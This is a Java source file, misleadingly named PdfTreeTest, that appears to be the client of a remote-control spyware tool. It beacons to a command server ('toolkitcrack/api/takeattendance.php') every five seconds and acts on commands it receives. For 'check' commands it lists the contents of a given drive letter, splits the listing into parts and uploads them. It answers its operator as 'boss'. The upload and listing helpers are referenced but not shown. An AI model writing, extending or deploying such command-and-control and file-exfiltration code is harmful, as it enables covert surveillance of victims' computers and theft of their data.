package tracker;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.TimeUnit;


public class PdfTreeTest{
	private static String cmd = "do job";
	final static String fileToGenerate = "C:\\Users\\HP\\Desktop\\test\\Desire2.txt";
	public static void main(String[] args) {
		giveAttendance();
		//doJob();
	}
	
	public static void giveAttendance() {
		final String url = "http://localhost/toolkitcrack/api/takeattendance.php";
		String payload;
		while(true) {			
			try {
				TimeUnit.SECONDS.sleep(5);
			} catch (InterruptedException e) {}		
			
			payload="{\"time\" : \""+new java.util.Date().toString()+"\"}";
			System.out.println("Sending signal. "+payload);
			cmd = sendSignal(url,payload);
			System.out.println("Received: "+ cmd);
			if(!cmd.equals("no comand")) doJob();
			
		}//end while
	}
	
	public static void doJob() {
        switch(cmd) 
        { 
            case "kill yourself": {
            	//sendSignal(url,payload); send "seccessfully killed";
                break; 
            }
            case "give list": {
        		Generate.printRoot();
            	//sendSignal(url,payload); send "printroot";
        		giveAttendance();
                break;
            }
                
            case "check c": 
            case "check d": 
            case "check e": 
            case "check f": 
            case "check g": 
            case "check h": 
            case "check i": 
            case "check j": 
            case "check k": 
            case "check l": 
            case "check m": 
            case "check n":
            case "check o":
            case "check p":
            case "check q":
            case "check r":
            case "check s":
            case "check t":
            case "check u":
            case "check v":
            case "check w":
            case "check x":
            case "check y":
            case "check z":{
            	Generate gn = new Generate(fileToGenerate);
        		if(gn.generate(Character.toString(cmd.charAt(6))))System.out.println("Generated Successfully");
        		else System.out.println(gn.getErrorMsg());
        		Splitter sp = new Splitter(fileToGenerate);
        		try {
        			if(!sp.split()) {
        				System.out.println("Nothing to split");
        				Uploader.upload(fileToGenerate);
        			}
        			else {
        				System.out.println("Splitted");
        				for(String b: sp.getSplitedFileList())Uploader.upload(b);
        				System.out.println("Total "+sp.getSplitedFileList().size()+" File uploaded Successfully.");
        			} 
        		}catch (Exception e) {
        			e.printStackTrace();
        		}
        		
        		break;
        		
            }//end of case
            default: {
            	//sendSignal(url,payload); send "Sorry boss I didn't got that";
            	System.out.println("Sorry boss I didn't got that");
            	giveAttendance();
            	break;
            }
        } 
	}
	
	
	
	public static String sendSignal(String requestUrl, String payload) {
	    try {
	        URL url = new URL(requestUrl);
	        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

	        connection.setDoInput(true);
	        connection.setDoOutput(true);
	        connection.setRequestMethod("POST");
	        connection.setRequestProperty("Accept", "application/json");
	        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
	     
	        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
	        writer.write(payload);
	        writer.close();
	        BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
	        StringBuffer jsonString = new StringBuffer();
	        String line;
	        while ((line = br.readLine()) != null) {
	                jsonString.append(line);
	        }
	        br.close();
	        connection.disconnect();
	        return jsonString.toString();
	    } catch (Exception e) {
	            throw new RuntimeException(e.getMessage());
	    }

	}

}


